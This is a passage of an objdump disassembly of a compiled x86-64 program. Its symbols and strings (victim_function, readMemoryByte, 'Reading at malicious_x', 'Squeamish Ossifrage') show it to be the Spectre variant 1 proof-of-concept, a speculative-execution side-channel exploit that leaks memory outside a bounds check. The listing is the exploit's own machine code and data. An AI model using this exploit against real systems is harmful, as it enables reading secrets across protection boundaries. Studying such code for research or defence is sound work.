  40090b:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40090e:	48 98                	cltq   
  400910:	c6 80 c0 15 60 00 01 	movb   $0x1,0x6015c0(%rax)
  400917:	83 45 fc 01          	addl   $0x1,-0x4(%rbp)
  40091b:	8b 45 fc             	mov    -0x4(%rbp),%eax
  40091e:	3d ff ff 01 00       	cmp    $0x1ffff,%eax
  400923:	76 e6                	jbe    40090b <main+0x3b>
  400925:	83 7d cc 03          	cmpl   $0x3,-0x34(%rbp)
  400929:	75 55                	jne    400980 <main+0xb0>
  40092b:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  40092f:	48 83 c0 08          	add    $0x8,%rax
  400933:	48 8b 00             	mov    (%rax),%rax
  400936:	48 8d 55 f0          	lea    -0x10(%rbp),%rdx
  40093a:	be 50 0b 40 00       	mov    $0x400b50,%esi
  40093f:	48 89 c7             	mov    %rax,%rdi
  400942:	b8 00 00 00 00       	mov    $0x0,%eax
  400947:	e8 74 fb ff ff       	callq  4004c0 <__isoc99_sscanf@plt>
  40094c:	48 8b 55 f0          	mov    -0x10(%rbp),%rdx
  400950:	b8 80 10 60 00       	mov    $0x601080,%eax
  400955:	48 29 c2             	sub    %rax,%rdx
  400958:	48 89 d0             	mov    %rdx,%rax
  40095b:	48 89 45 f0          	mov    %rax,-0x10(%rbp)
  40095f:	48 8b 45 c0          	mov    -0x40(%rbp),%rax
  400963:	48 83 c0 10          	add    $0x10,%rax
  400967:	48 8b 00             	mov    (%rax),%rax
  40096a:	48 8d 55 dc          	lea    -0x24(%rbp),%rdx
  40096e:	be 53 0b 40 00       	mov    $0x400b53,%esi
  400973:	48 89 c7             	mov    %rax,%rdi
  400976:	b8 00 00 00 00       	mov    $0x0,%eax
  40097b:	e8 40 fb ff ff       	callq  4004c0 <__isoc99_sscanf@plt>
  400980:	8b 45 dc             	mov    -0x24(%rbp),%eax
  400983:	89 c6                	mov    %eax,%esi
  400985:	bf 56 0b 40 00       	mov    $0x400b56,%edi
  40098a:	b8 00 00 00 00       	mov    $0x0,%eax
  40098f:	e8 0c fb ff ff       	callq  4004a0 <printf@plt>
  400994:	e9 c6 00 00 00       	jmpq   400a5f <main+0x18f>
  400999:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  40099d:	48 89 c6             	mov    %rax,%rsi
  4009a0:	bf 70 0b 40 00       	mov    $0x400b70,%edi
  4009a5:	b8 00 00 00 00       	mov    $0x0,%eax
  4009aa:	e8 f1 fa ff ff       	callq  4004a0 <printf@plt>
  4009af:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
  4009b3:	48 8d 50 01          	lea    0x1(%rax),%rdx
  4009b7:	48 89 55 f0          	mov    %rdx,-0x10(%rbp)
  4009bb:	48 8d 55 e0          	lea    -0x20(%rbp),%rdx
  4009bf:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
  4009c3:	48 89 ce             	mov    %rcx,%rsi
  4009c6:	48 89 c7             	mov    %rax,%rdi
  4009c9:	e8 ff fb ff ff       	callq  4005cd <readMemoryByte>
  4009ce:	8b 45 e0             	mov    -0x20(%rbp),%eax
  4009d1:	8b 55 e4             	mov    -0x1c(%rbp),%edx
  4009d4:	01 d2                	add    %edx,%edx
  4009d6:	39 d0                	cmp    %edx,%eax
  4009d8:	7c 07                	jl     4009e1 <main+0x111>
  4009da:	b8 90 0b 40 00       	mov    $0x400b90,%eax
  4009df:	eb 05                	jmp    4009e6 <main+0x116>
  4009e1:	b8 98 0b 40 00       	mov    $0x400b98,%eax
  4009e6:	48 89 c6             	mov    %rax,%rsi
  4009e9:	bf a0 0b 40 00       	mov    $0x400ba0,%edi
  4009ee:	b8 00 00 00 00       	mov    $0x0,%eax
  4009f3:	e8 a8 fa ff ff       	callq  4004a0 <printf@plt>
  4009f8:	8b 55 e0             	mov    -0x20(%rbp),%edx
  4009fb:	0f b6 45 d0          	movzbl -0x30(%rbp),%eax
  4009ff:	3c 1f                	cmp    $0x1f,%al
  400a01:	76 11                	jbe    400a14 <main+0x144>
  400a03:	0f b6 45 d0          	movzbl -0x30(%rbp),%eax
  400a07:	3c 7e                	cmp    $0x7e,%al
  400a09:	77 09                	ja     400a14 <main+0x144>
  400a0b:	0f b6 45 d0          	movzbl -0x30(%rbp),%eax
  400a0f:	0f b6 c0             	movzbl %al,%eax
  400a12:	eb 05                	jmp    400a19 <main+0x149>
  400a14:	b8 00 00 00 00       	mov    $0x0,%eax
  400a19:	0f b6 4d d0          	movzbl -0x30(%rbp),%ecx
  400a1d:	0f b6 f1             	movzbl %cl,%esi
  400a20:	89 d1                	mov    %edx,%ecx
  400a22:	89 c2                	mov    %eax,%edx
  400a24:	bf a5 0b 40 00       	mov    $0x400ba5,%edi
  400a29:	b8 00 00 00 00       	mov    $0x0,%eax
  400a2e:	e8 6d fa ff ff       	callq  4004a0 <printf@plt>
  400a33:	8b 45 e4             	mov    -0x1c(%rbp),%eax
  400a36:	85 c0                	test   %eax,%eax
  400a38:	7e 1b                	jle    400a55 <main+0x185>
  400a3a:	8b 55 e4             	mov    -0x1c(%rbp),%edx
  400a3d:	0f b6 45 d1          	movzbl -0x2f(%rbp),%eax
  400a41:	0f b6 c0             	movzbl %al,%eax
  400a44:	89 c6                	mov    %eax,%esi
  400a46:	bf c0 0b 40 00       	mov    $0x400bc0,%edi
  400a4b:	b8 00 00 00 00       	mov    $0x0,%eax
  400a50:	e8 4b fa ff ff       	callq  4004a0 <printf@plt>
  400a55:	bf 0a 00 00 00       	mov    $0xa,%edi
  400a5a:	e8 31 fa ff ff       	callq  400490 <putchar@plt>
  400a5f:	8b 45 dc             	mov    -0x24(%rbp),%eax
  400a62:	83 e8 01             	sub    $0x1,%eax
  400a65:	89 45 dc             	mov    %eax,-0x24(%rbp)
  400a68:	8b 45 dc             	mov    -0x24(%rbp),%eax
  400a6b:	85 c0                	test   %eax,%eax
  400a6d:	0f 89 26 ff ff ff    	jns    400999 <main+0xc9>
  400a73:	b8 00 00 00 00       	mov    $0x0,%eax
  400a78:	c9                   	leaveq 
  400a79:	c3                   	retq   

0000000000400a7a <victim_function>:
  400a7a:	55                   	push   %rbp
  400a7b:	48 89 e5             	mov    %rsp,%rbp
  400a7e:	48 89 7d f8          	mov    %rdi,-0x8(%rbp)
  400a82:	8b 05 d8 05 20 00    	mov    0x2005d8(%rip),%eax        # 601060 <array1_size>
  400a88:	89 c0                	mov    %eax,%eax
  400a8a:	48 3b 45 f8          	cmp    -0x8(%rbp),%rax
  400a8e:	76 2b                	jbe    400abb <victim_function+0x41>
  400a90:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
  400a94:	48 05 80 10 60 00    	add    $0x601080,%rax
  400a9a:	0f b6 00             	movzbl (%rax),%eax
  400a9d:	0f b6 c0             	movzbl %al,%eax
  400aa0:	c1 e0 09             	shl    $0x9,%eax
  400aa3:	48 98                	cltq   
  400aa5:	0f b6 90 c0 15 60 00 	movzbl 0x6015c0(%rax),%edx
  400aac:	0f b6 05 ad 0a 20 00 	movzbl 0x200aad(%rip),%eax        # 601560 <temp>
  400ab3:	21 d0                	and    %edx,%eax
  400ab5:	88 05 a5 0a 20 00    	mov    %al,0x200aa5(%rip)        # 601560 <temp>
  400abb:	5d                   	pop    %rbp
  400abc:	c3                   	retq   
  400abd:	0f 1f 00             	nopl   (%rax)

0000000000400ac0 <__libc_csu_init>:
  400ac0:	41 57                	push   %r15
  400ac2:	41 89 ff             	mov    %edi,%r15d
  400ac5:	41 56                	push   %r14
  400ac7:	49 89 f6             	mov    %rsi,%r14
  400aca:	41 55                	push   %r13
  400acc:	49 89 d5             	mov    %rdx,%r13
  400acf:	41 54                	push   %r12
  400ad1:	4c 8d 25 38 03 20 00 	lea    0x200338(%rip),%r12        # 600e10 <__frame_dummy_init_array_entry>
  400ad8:	55                   	push   %rbp
  400ad9:	48 8d 2d 38 03 20 00 	lea    0x200338(%rip),%rbp        # 600e18 <__init_array_end>
  400ae0:	53                   	push   %rbx
  400ae1:	4c 29 e5             	sub    %r12,%rbp
  400ae4:	31 db                	xor    %ebx,%ebx
  400ae6:	48 c1 fd 03          	sar    $0x3,%rbp
  400aea:	48 83 ec 08          	sub    $0x8,%rsp
  400aee:	e8 6d f9 ff ff       	callq  400460 <_init>
  400af3:	48 85 ed             	test   %rbp,%rbp
  400af6:	74 1e                	je     400b16 <__libc_csu_init+0x56>
  400af8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
  400aff:	00 
  400b00:	4c 89 ea             	mov    %r13,%rdx
  400b03:	4c 89 f6             	mov    %r14,%rsi
  400b06:	44 89 ff             	mov    %r15d,%edi
  400b09:	41 ff 14 dc          	callq  *(%r12,%rbx,8)
  400b0d:	48 83 c3 01          	add    $0x1,%rbx
  400b11:	48 39 eb             	cmp    %rbp,%rbx
  400b14:	75 ea                	jne    400b00 <__libc_csu_init+0x40>
  400b16:	48 83 c4 08          	add    $0x8,%rsp
  400b1a:	5b                   	pop    %rbx
  400b1b:	5d                   	pop    %rbp
  400b1c:	41 5c                	pop    %r12
  400b1e:	41 5d                	pop    %r13
  400b20:	41 5e                	pop    %r14
  400b22:	41 5f                	pop    %r15
  400b24:	c3                   	retq   
  400b25:	90                   	nop
  400b26:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)
  400b2d:	00 00 00 

0000000000400b30 <__libc_csu_fini>:
  400b30:	f3 c3                	repz retq 

Disassembly of section .fini:

0000000000400b34 <_fini>:
  400b34:	48 83 ec 08          	sub    $0x8,%rsp
  400b38:	48 83 c4 08          	add    $0x8,%rsp
  400b3c:	c3                   	retq   

Disassembly of section .rodata:

0000000000400b40 <_IO_stdin_used>:
  400b40:	01 00                	add    %eax,(%rax)
  400b42:	02 00                	add    (%rax),%al
  400b44:	00 00                	add    %al,(%rax)
	...

0000000000400b48 <__dso_handle>:
	...
  400b50:	25 70 00 25 64       	and    $0x64250070,%eax
  400b55:	00 52 65             	add    %dl,0x65(%rdx)
  400b58:	61                   	(bad)  
  400b59:	64 69 6e 67 20 25 64 	imul   $0x20642520,%fs:0x67(%rsi),%ebp
  400b60:	20 
  400b61:	62                   	(bad)  
  400b62:	79 74                	jns    400bd8 <__dso_handle+0x90>
  400b64:	65 73 3a             	gs jae 400ba1 <__dso_handle+0x59>
  400b67:	0a 00                	or     (%rax),%al
  400b69:	00 00                	add    %al,(%rax)
  400b6b:	00 00                	add    %al,(%rax)
  400b6d:	00 00                	add    %al,(%rax)
  400b6f:	00 52 65             	add    %dl,0x65(%rdx)
  400b72:	61                   	(bad)  
  400b73:	64 69 6e 67 20 61 74 	imul   $0x20746120,%fs:0x67(%rsi),%ebp
  400b7a:	20 
  400b7b:	6d                   	insl   (%dx),%es:(%rdi)
  400b7c:	61                   	(bad)  
  400b7d:	6c                   	insb   (%dx),%es:(%rdi)
  400b7e:	69 63 69 6f 75 73 5f 	imul   $0x5f73756f,0x69(%rbx),%esp
  400b85:	78 20                	js     400ba7 <__dso_handle+0x5f>
  400b87:	3d 20 25 70 2e       	cmp    $0x2e702520,%eax
  400b8c:	2e 2e 20 00          	cs and %al,%cs:(%rax)
  400b90:	53                   	push   %rbx
  400b91:	75 63                	jne    400bf6 <__dso_handle+0xae>
  400b93:	63 65 73             	movslq 0x73(%rbp),%esp
  400b96:	73 00                	jae    400b98 <__dso_handle+0x50>
  400b98:	55                   	push   %rbp
  400b99:	6e                   	outsb  %ds:(%rsi),(%dx)
  400b9a:	63 6c 65 61          	movslq 0x61(%rbp,%riz,2),%ebp
  400b9e:	72 00                	jb     400ba0 <__dso_handle+0x58>
  400ba0:	25 73 3a 20 00       	and    $0x203a73,%eax
  400ba5:	30 78 25             	xor    %bh,0x25(%rax)
  400ba8:	30 32                	xor    %dh,(%rdx)
  400baa:	58                   	pop    %rax
  400bab:	3d e2 80 99 25       	cmp    $0x259980e2,%eax
  400bb0:	63 e2                	movslq %edx,%esp
  400bb2:	80 99 20 73 63 6f 72 	sbbb   $0x72,0x6f637320(%rcx)
  400bb9:	65 3d 25 64 20 00    	gs cmp $0x206425,%eax
  400bbf:	00 28                	add    %ch,(%rax)
  400bc1:	73 65                	jae    400c28 <__GNU_EH_FRAME_HDR+0x1c>
  400bc3:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
  400bc6:	64 20 62 65          	and    %ah,%fs:0x65(%rdx)
  400bca:	73 74                	jae    400c40 <__GNU_EH_FRAME_HDR+0x34>
  400bcc:	3a 20                	cmp    (%rax),%ah
  400bce:	30 78 25             	xor    %bh,0x25(%rax)
  400bd1:	30 32                	xor    %dh,(%rdx)
  400bd3:	58                   	pop    %rax
  400bd4:	20 73 63             	and    %dh,0x63(%rbx)
  400bd7:	6f                   	outsl  %ds:(%rsi),(%dx)
  400bd8:	72 65                	jb     400c3f <__GNU_EH_FRAME_HDR+0x33>
  400bda:	3d 25 64 29 00       	cmp    $0x296425,%eax
  400bdf:	00 54 68 65          	add    %dl,0x65(%rax,%rbp,2)
  400be3:	20 4d 61             	and    %cl,0x61(%rbp)
  400be6:	67 69 63 20 57 6f 72 	imul   $0x64726f57,0x20(%ebx),%esp
  400bed:	64 
  400bee:	73 20                	jae    400c10 <__GNU_EH_FRAME_HDR+0x4>
  400bf0:	61                   	(bad)  
  400bf1:	72 65                	jb     400c58 <__GNU_EH_FRAME_HDR+0x4c>
  400bf3:	20 53 71             	and    %dl,0x71(%rbx)
  400bf6:	75 65                	jne    400c5d <__GNU_EH_FRAME_HDR+0x51>
  400bf8:	61                   	(bad)  
  400bf9:	6d                   	insl   (%dx),%es:(%rdi)
  400bfa:	69 73 68 20 4f 73 73 	imul   $0x73734f20,0x68(%rbx),%esi
  400c01:	69 66 72 61 67 65 2e 	imul   $0x2e656761,0x72(%rsi),%esp
	...

Disassembly of section .eh_frame_hdr:

0000000000400c0c <__GNU_EH_FRAME_HDR>:
  400c0c:	01 1b                	add    %ebx,(%rbx)
  400c0e:	03 3b                	add    (%rbx),%edi
  400c10:	40 00 00             	add    %al,(%rax)
  400c13:	00 07                	add    %al,(%rdi)
  400c15:	00 00                	add    %al,(%rax)
  400c17:	00 74 f8 ff          	add    %dh,-0x1(%rax,%rdi,8)
  400c1b:	ff 8c 00 00 00 d4 f8 	decl   -0x72c0000(%rax,%rax,1)
  400c22:	ff                   	(bad)  
  400c23:	ff 5c 00 00          	lcall  *0x0(%rax,%rax,1)
  400c27:	00 c1                	add    %al,%cl
  400c29:	f9                   	stc    
  400c2a:	ff                   	(bad)  
  400c2b:	ff b4 00 00 00 c4 fc 	pushq  -0x33c0000(%rax,%rax,1)
  400c32:	ff                   	(bad)  
  400c33:	ff                   	(bad)  
  400c34:	dc 00                	faddl  (%rax)
  400c36:	00 00                	add    %al,(%rax)
  400c38:	6e                   	outsb  %ds:(%rsi),(%dx)
  400c39:	fe                   	(bad)  
  400c3a:	ff                   	(bad)  
  400c3b:	ff                   	(bad)  
  400c3c:	fc                   	cld    
  400c3d:	00 00                	add    %al,(%rax)
  400c3f:	00 b4 fe ff ff 1c 01 	add    %dh,0x11cffff(%rsi,%rdi,8)
  400c46:	00 00                	add    %al,(%rax)
  400c48:	24 ff                	and    $0xff,%al
  400c4a:	ff                   	(bad)  
  400c4b:	ff 64 01 00          	jmpq   *0x0(%rcx,%rax,1)
	...

Disassembly of section .eh_frame:

0000000000400c50 <__FRAME_END__-0x138>:
  400c50:	14 00                	adc    $0x0,%al
  400c52:	00 00                	add    %al,(%rax)
  400c54:	00 00                	add    %al,(%rax)
  400c56:	00 00                	add    %al,(%rax)
  400c58:	01 7a 52             	add    %edi,0x52(%rdx)
  400c5b:	00 01                	add    %al,(%rcx)
  400c5d:	78 10                	js     400c6f <__GNU_EH_FRAME_HDR+0x63>
  400c5f:	01 1b                	add    %ebx,(%rbx)
  400c61:	0c 07                	or     $0x7,%al
  400c63:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
  400c69:	00 00                	add    %al,(%rax)
  400c6b:	00 1c 00             	add    %bl,(%rax,%rax,1)
  400c6e:	00 00                	add    %al,(%rax)
  400c70:	70 f8                	jo     400c6a <__GNU_EH_FRAME_HDR+0x5e>
  400c72:	ff                   	(bad)  
  400c73:	ff 2a                	ljmp   *(%rdx)
	...
  400c7d:	00 00                	add    %al,(%rax)
  400c7f:	00 14 00             	add    %dl,(%rax,%rax,1)
  400c82:	00 00                	add    %al,(%rax)
  400c84:	00 00                	add    %al,(%rax)
  400c86:	00 00                	add    %al,(%rax)
  400c88:	01 7a 52             	add    %edi,0x52(%rdx)
  400c8b:	00 01                	add    %al,(%rcx)
  400c8d:	78 10                	js     400c9f <__GNU_EH_FRAME_HDR+0x93>
  400c8f:	01 1b                	add    %ebx,(%rbx)
  400c91:	0c 07                	or     $0x7,%al
  400c93:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
  400c99:	00 00                	add    %al,(%rax)
  400c9b:	00 1c 00             	add    %bl,(%rax,%rax,1)
  400c9e:	00 00                	add    %al,(%rax)
  400ca0:	e0 f7                	loopne 400c99 <__GNU_EH_FRAME_HDR+0x8d>
  400ca2:	ff                   	(bad)  
  400ca3:	ff 50 00             	callq  *0x0(%rax)
  400ca6:	00 00                	add    %al,(%rax)
  400ca8:	00 0e                	add    %cl,(%rsi)
  400caa:	10 46 0e             	adc    %al,0xe(%rsi)
  400cad:	18 4a 0f             	sbb    %cl,0xf(%rdx)
  400cb0:	0b 77 08             	or     0x8(%rdi),%esi
  400cb3:	80 00 3f             	addb   $0x3f,(%rax)
  400cb6:	1a 3b                	sbb    (%rbx),%bh
  400cb8:	2a 33                	sub    (%rbx),%dh
  400cba:	24 22                	and    $0x22,%al
  400cbc:	00 00                	add    %al,(%rax)
  400cbe:	00 00                	add    %al,(%rax)
  400cc0:	24 00                	and    $0x0,%al
  400cc2:	00 00                	add    %al,(%rax)
  400cc4:	44 00 00             	add    %r8b,(%rax)
  400cc7:	00 05 f9 ff ff 03    	add    %al,0x3fffff9(%rip)        # 4400cc6 <_end+0x3ddf6c6>
  400ccd:	03 00                	add    (%rax),%eax
  400ccf:	00 00                	add    %al,(%rax)
  400cd1:	41 0e                	rex.B (bad) 
  400cd3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  400cd9:	45 83 03 03          	rex.RB addl $0x3,(%r11)
  400cdd:	f9                   	stc    
  400cde:	02 0c 07             	add    (%rdi,%rax,1),%cl
  400ce1:	08 00                	or     %al,(%rax)
  400ce3:	00 00                	add    %al,(%rax)
  400ce5:	00 00                	add    %al,(%rax)
  400ce7:	00 1c 00             	add    %bl,(%rax,%rax,1)
  400cea:	00 00                	add    %al,(%rax)
  400cec:	6c                   	insb   (%dx),%es:(%rdi)
  400ced:	00 00                	add    %al,(%rax)
  400cef:	00 e0                	add    %ah,%al
  400cf1:	fb                   	sti    
  400cf2:	ff                   	(bad)  
  400cf3:	ff aa 01 00 00 00    	ljmp   *0x1(%rdx)
  400cf9:	41 0e                	rex.B (bad) 
  400cfb:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  400d01:	03 a5 01 0c 07 08    	add    0x8070c01(%rbp),%esp
  400d07:	00 1c 00             	add    %bl,(%rax,%rax,1)
  400d0a:	00 00                	add    %al,(%rax)
  400d0c:	8c 00                	mov    %es,(%rax)
  400d0e:	00 00                	add    %al,(%rax)
  400d10:	6a fd                	pushq  $0xfffffffffffffffd
  400d12:	ff                   	(bad)  
  400d13:	ff 43 00             	incl   0x0(%rbx)
  400d16:	00 00                	add    %al,(%rax)
  400d18:	00 41 0e             	add    %al,0xe(%rcx)
  400d1b:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
  400d21:	7e 0c                	jle    400d2f <__GNU_EH_FRAME_HDR+0x123>
  400d23:	07                   	(bad)  
  400d24:	08 00                	or     %al,(%rax)
  400d26:	00 00                	add    %al,(%rax)
  400d28:	44 00 00             	add    %r8b,(%rax)
  400d2b:	00 ac 00 00 00 90 fd 	add    %ch,-0x2700000(%rax,%rax,1)
  400d32:	ff                   	(bad)  
  400d33:	ff 65 00             	jmpq   *0x0(%rbp)
  400d36:	00 00                	add    %al,(%rax)
  400d38:	00 42 0e             	add    %al,0xe(%rdx)
  400d3b:	10 8f 02 45 0e 18    	adc    %cl,0x180e4502(%rdi)
  400d41:	8e 03                	mov    (%rbx),%es
  400d43:	45 0e                	rex.RB (bad) 
  400d45:	20 8d 04 45 0e 28    	and    %cl,0x280e4504(%rbp)
  400d4b:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86701b99 <_end+0xffffffff860e0599>
  400d51:	06                   	(bad)  
  400d52:	48 0e                	rex.W (bad) 
  400d54:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
  400d5a:	6c                   	insb   (%dx),%es:(%rdi)
  400d5b:	0e                   	(bad)  
  400d5c:	38 41 0e             	cmp    %al,0xe(%rcx)
  400d5f:	30 41 0e             	xor    %al,0xe(%rcx)
  400d62:	28 42 0e             	sub    %al,0xe(%rdx)
  400d65:	20 42 0e             	and    %al,0xe(%rdx)
  400d68:	18 42 0e             	sbb    %al,0xe(%rdx)
  400d6b:	10 42 0e             	adc    %al,0xe(%rdx)
  400d6e:	08 00                	or     %al,(%rax)
  400d70:	14 00                	adc    $0x0,%al
  400d72:	00 00                	add    %al,(%rax)
  400d74:	f4                   	hlt    
  400d75:	00 00                	add    %al,(%rax)
  400d77:	00 b8 fd ff ff 02    	add    %bh,0x2fffffd(%rax)
	...

0000000000400d88 <__FRAME_END__>:
  400d88:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000600e10 <__frame_dummy_init_array_entry>:
  600e10:	a0                   	.byte 0xa0
  600e11:	05 40 00 00 00       	add    $0x40,%eax
	...

Disassembly of section .fini_array:

0000000000600e18 <__do_global_dtors_aux_fini_array_entry>:
  600e18:	80 05 40 00 00 00 00 	addb   $0x0,0x40(%rip)        # 600e5f <_DYNAMIC+0x37>
	...

Disassembly of section .jcr:

0000000000600e20 <__JCR_END__>:
	...

Disassembly of section .dynamic:

0000000000600e28 <_DYNAMIC>:
  600e28:	01 00                	add    %eax,(%rax)
  600e2a:	00 00                	add    %al,(%rax)
  600e2c:	00 00                	add    %al,(%rax)
  600e2e:	00 00                	add    %al,(%rax)
  600e30:	01 00                	add    %eax,(%rax)
  600e32:	00 00                	add    %al,(%rax)
  600e34:	00 00                	add    %al,(%rax)
  600e36:	00 00                	add    %al,(%rax)
  600e38:	0c 00                	or     $0x0,%al
  600e3a:	00 00                	add    %al,(%rax)
  600e3c:	00 00                	add    %al,(%rax)
  600e3e:	00 00                	add    %al,(%rax)
  600e40:	60                   	(bad)  
  600e41:	04 40                	add    $0x40,%al
  600e43:	00 00                	add    %al,(%rax)
  600e45:	00 00                	add    %al,(%rax)
  600e47:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 600e4d <_DYNAMIC+0x25>
  600e4d:	00 00                	add    %al,(%rax)
  600e4f:	00 34 0b             	add    %dh,(%rbx,%rcx,1)
  600e52:	40 00 00             	add    %al,(%rax)
  600e55:	00 00                	add    %al,(%rax)
  600e57:	00 19                	add    %bl,(%rcx)
  600e59:	00 00                	add    %al,(%rax)
  600e5b:	00 00                	add    %al,(%rax)
  600e5d:	00 00                	add    %al,(%rax)
  600e5f:	00 10                	add    %dl,(%rax)
  600e61:	0e                   	(bad)  
  600e62:	60                   	(bad)  
  600e63:	00 00                	add    %al,(%rax)
  600e65:	00 00                	add    %al,(%rax)
  600e67:	00 1b                	add    %bl,(%rbx)
  600e69:	00 00                	add    %al,(%rax)
  600e6b:	00 00                	add    %al,(%rax)
  600e6d:	00 00                	add    %al,(%rax)
  600e6f:	00 08                	add    %cl,(%rax)
  600e71:	00 00                	add    %al,(%rax)
  600e73:	00 00                	add    %al,(%rax)
  600e75:	00 00                	add    %al,(%rax)
  600e77:	00 1a                	add    %bl,(%rdx)
  600e79:	00 00                	add    %al,(%rax)
  600e7b:	00 00                	add    %al,(%rax)
  600e7d:	00 00                	add    %al,(%rax)
  600e7f:	00 18                	add    %bl,(%rax)
  600e81:	0e                   	(bad)  
  600e82:	60                   	(bad)  
  600e83:	00 00                	add    %al,(%rax)
  600e85:	00 00                	add    %al,(%rax)
  600e87:	00 1c 00             	add    %bl,(%rax,%rax,1)
  600e8a:	00 00                	add    %al,(%rax)
  600e8c:	00 00                	add    %al,(%rax)
  600e8e:	00 00                	add    %al,(%rax)
  600e90:	08 00                	or     %al,(%rax)
  600e92:	00 00                	add    %al,(%rax)
  600e94:	00 00                	add    %al,(%rax)
  600e96:	00 00                	add    %al,(%rax)
  600e98:	f5                   	cmc    
  600e99:	fe                   	(bad)  
  600e9a:	ff 6f 00             	ljmp   *0x0(%rdi)
  600e9d:	00 00                	add    %al,(%rax)
  600e9f:	00 98 02 40 00 00    	add    %bl,0x4002(%rax)
  600ea5:	00 00                	add    %al,(%rax)
  600ea7:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 600ead <_DYNAMIC+0x85>
  600ead:	00 00                	add    %al,(%rax)
  600eaf:	00 48 03             	add    %cl,0x3(%rax)
  600eb2:	40 00 00             	add    %al,(%rax)
  600eb5:	00 00                	add    %al,(%rax)
  600eb7:	00 06                	add    %al,(%rsi)
  600eb9:	00 00                	add    %al,(%rax)
  600ebb:	00 00                	add    %al,(%rax)
  600ebd:	00 00                	add    %al,(%rax)
  600ebf:	00 b8 02 40 00 00    	add    %bh,0x4002(%rax)
  600ec5:	00 00                	add    %al,(%rax)
  600ec7:	00 0a                	add    %cl,(%rdx)
  600ec9:	00 00                	add    %al,(%rax)
  600ecb:	00 00                	add    %al,(%rax)
  600ecd:	00 00                	add    %al,(%rax)
  600ecf:	00 61 00             	add    %ah,0x0(%rcx)
  600ed2:	00 00                	add    %al,(%rax)
  600ed4:	00 00                	add    %al,(%rax)
  600ed6:	00 00                	add    %al,(%rax)
  600ed8:	0b 00                	or     (%rax),%eax
  600eda:	00 00                	add    %al,(%rax)
  600edc:	00 00                	add    %al,(%rax)
  600ede:	00 00                	add    %al,(%rax)
  600ee0:	18 00                	sbb    %al,(%rax)
  600ee2:	00 00                	add    %al,(%rax)
  600ee4:	00 00                	add    %al,(%rax)
  600ee6:	00 00                	add    %al,(%rax)
  600ee8:	15 00 00 00 00       	adc    $0x0,%eax
	...
  600ef5:	00 00                	add    %al,(%rax)
  600ef7:	00 03                	add    %al,(%rbx)
	...
  600f01:	10 60 00             	adc    %ah,0x0(%rax)
  600f04:	00 00                	add    %al,(%rax)
  600f06:	00 00                	add    %al,(%rax)
  600f08:	02 00                	add    (%rax),%al
  600f0a:	00 00                	add    %al,(%rax)
  600f0c:	00 00                	add    %al,(%rax)
  600f0e:	00 00                	add    %al,(%rax)
  600f10:	60                   	(bad)  
  600f11:	00 00                	add    %al,(%rax)
  600f13:	00 00                	add    %al,(%rax)
  600f15:	00 00                	add    %al,(%rax)
  600f17:	00 14 00             	add    %dl,(%rax,%rax,1)
  600f1a:	00 00                	add    %al,(%rax)
  600f1c:	00 00                	add    %al,(%rax)
  600f1e:	00 00                	add    %al,(%rax)
  600f20:	07                   	(bad)  
  600f21:	00 00                	add    %al,(%rax)
  600f23:	00 00                	add    %al,(%rax)
  600f25:	00 00                	add    %al,(%rax)
  600f27:	00 17                	add    %dl,(%rdi)
	...
  600f31:	04 40                	add    $0x40,%al
  600f33:	00 00                	add    %al,(%rax)
  600f35:	00 00                	add    %al,(%rax)
  600f37:	00 07                	add    %al,(%rdi)
  600f39:	00 00                	add    %al,(%rax)
  600f3b:	00 00                	add    %al,(%rax)
  600f3d:	00 00                	add    %al,(%rax)
  600f3f:	00 e8                	add    %ch,%al
  600f41:	03 40 00             	add    0x0(%rax),%eax
  600f44:	00 00                	add    %al,(%rax)
  600f46:	00 00                	add    %al,(%rax)
  600f48:	08 00                	or     %al,(%rax)
  600f4a:	00 00                	add    %al,(%rax)
  600f4c:	00 00                	add    %al,(%rax)
  600f4e:	00 00                	add    %al,(%rax)
  600f50:	18 00                	sbb    %al,(%rax)
  600f52:	00 00                	add    %al,(%rax)
  600f54:	00 00                	add    %al,(%rax)
  600f56:	00 00                	add    %al,(%rax)
  600f58:	09 00                	or     %eax,(%rax)
  600f5a:	00 00                	add    %al,(%rax)
  600f5c:	00 00                	add    %al,(%rax)
  600f5e:	00 00                	add    %al,(%rax)
  600f60:	18 00                	sbb    %al,(%rax)
  600f62:	00 00                	add    %al,(%rax)
  600f64:	00 00                	add    %al,(%rax)
  600f66:	00 00                	add    %al,(%rax)
  600f68:	fe                   	(bad)  
  600f69:	ff                   	(bad)  
  600f6a:	ff 6f 00             	ljmp   *0x0(%rdi)
  600f6d:	00 00                	add    %al,(%rax)
  600f6f:	00 b8 03 40 00 00    	add    %bh,0x4003(%rax)
  600f75:	00 00                	add    %al,(%rax)
  600f77:	00 ff                	add    %bh,%bh
  600f79:	ff                   	(bad)  
  600f7a:	ff 6f 00             	ljmp   *0x0(%rdi)
  600f7d:	00 00                	add    %al,(%rax)
  600f7f:	00 01                	add    %al,(%rcx)
  600f81:	00 00                	add    %al,(%rax)
  600f83:	00 00                	add    %al,(%rax)
  600f85:	00 00                	add    %al,(%rax)
  600f87:	00 f0                	add    %dh,%al
  600f89:	ff                   	(bad)  
  600f8a:	ff 6f 00             	ljmp   *0x0(%rdi)
  600f8d:	00 00                	add    %al,(%rax)
  600f8f:	00 aa 03 40 00 00    	add    %ch,0x4003(%rdx)
	...

Disassembly of section .got:

0000000000600ff8 <.got>:
	...

Disassembly of section .got.plt:

0000000000601000 <_GLOBAL_OFFSET_TABLE_>:
  601000:	28 0e                	sub    %cl,(%rsi)
  601002:	60                   	(bad)  
